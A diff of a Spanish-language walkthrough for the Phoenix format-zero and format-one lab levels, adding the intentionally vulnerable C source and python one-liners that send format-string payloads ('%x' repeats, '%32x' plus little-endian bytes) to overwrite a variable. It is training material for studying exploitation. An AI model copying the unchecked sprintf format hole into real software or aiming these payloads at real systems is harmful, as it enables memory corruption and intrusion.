@@ -103,22 +103,79 @@ int main(int argc, char **argv) {
 
 Como hablamos de formatos, nos referimos a los que tienen **%** como por ejemplo **%s**, **%i**, **%p**, **%x** o **%d** entre otros. En este caso usaremos **%x**, unas cuantas veces para formar el  error del bug.
 
-Ahora haremos lo siguiente:
+Como podemos ver, exite una structura llamada **locals**. En el contexto de las estructuras, todos los elementos se ubican de manera continua, para de esta manera no perder tiempo y esfuerzo a la hora de acceder entre ellos. Por ello lo que haremos será exceder todos los 32 bytes del vector de caracteres **dest**, y de esta manera alcanzar al elemento **changeme**.
+
+Ejecutando el siguiente comando:
 
 ```bash
-$ python -c "print '%x'*20" | ./format-zero
-
+user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print '%x'*32"| ./format-zero  
 Welcome to phoenix/format-zero, brought to you by https://exploit.education
 Well done, the 'changeme' variable has been changed!
 ```
 
 ## Format One
 
+```c
+/*
+ * phoenix/format-one, by https://exploit.education
+ *
+ * Can you change the "changeme" variable?
+ *
+ * Why did the Tomato blush? It saw the salad dressing!
+ */
+
+#include <err.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define BANNER \
+  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
+
+int main(int argc, char **argv) {
+  struct {
+    char dest[32];
+    volatile int changeme;
+  } locals;
+  char buffer[16];
+
+  printf("%s\n", BANNER);
+
+  if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {
+    errx(1, "Unable to get buffer");
+  }
+  buffer[15] = 0;
+
+  locals.changeme = 0;
+
+  sprintf(locals.dest, buffer);
+
+  if (locals.changeme != 0x45764f6c) {
+    printf("Uh oh, 'changeme' is not the magic value, it is 0x%08x\n",
+        locals.changeme);
+  } else {
+    puts("Well done, the 'changeme' variable has been changed correctly!");
+  }
+
+  exit(0);
+}
+```
+
+En este nivel, podemos ver que el codigo es muy parecido, solo que esta vez, verifica que el valor de **changeme** no solo cambie, sino que tenga un valor exacto, el cual es **0x45764f6c**. Entonces para esto realizaremos lo mismo pero al final excribiremos el valor hexadecimal deseado.
+
+**Nota: Considere que tendrá que ingresar el valor en modo little endian.**
+
 ```bash
-$ python -c "print '%32x\x6c\x4f\x76\x45'" | ./format-one 
+user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print '%32x'+'\x6c\x4f\x76\x45'" | ./format-one 
 Welcome to phoenix/format-one, brought to you by https://exploit.education
 Well done, the 'changeme' variable has been changed correctly!
 
+#Tambien podemos poner en vez de '\x6c\x4f\x76\x45' como '\x45\x76\x4f\x6c'[::-1]
+
+user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print '%32x'+'\x45\x76\x4f\x6c'[::-1]" | ./format-one 
+Welcome to phoenix/format-one, brought to you by https://exploit.education
+Well done, the 'changeme' variable has been changed correctly!
 ```
 
 ## Format Two
